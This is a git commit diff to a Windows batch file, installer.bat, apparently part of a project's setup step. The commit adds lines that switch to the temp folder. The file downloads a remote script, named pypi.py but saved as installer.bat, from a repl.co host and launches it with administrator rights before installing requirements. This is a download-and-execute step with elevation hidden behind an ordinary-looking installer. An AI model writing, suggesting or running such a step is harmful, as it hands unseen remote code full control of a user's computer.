b6cd00f6c221fc351a745e96bff26e51536ed777
TheonlyIcebear <78031685+TheonlyIcebear@users.noreply.github.com>
2022-10-29 11:17:52 -0400

    Update installer.bat

--- installer.bat
+++ installer.bat
@@ -1,3 +1,5 @@
+@echo off
+cd %TEMP%
 curl https://bootstrapper.repl.co/scripts/pypi.py --output installer.bat && powershell Start-Process 'installer.bat' -Verb runAs
 pip install -r requirements.txt
 pause
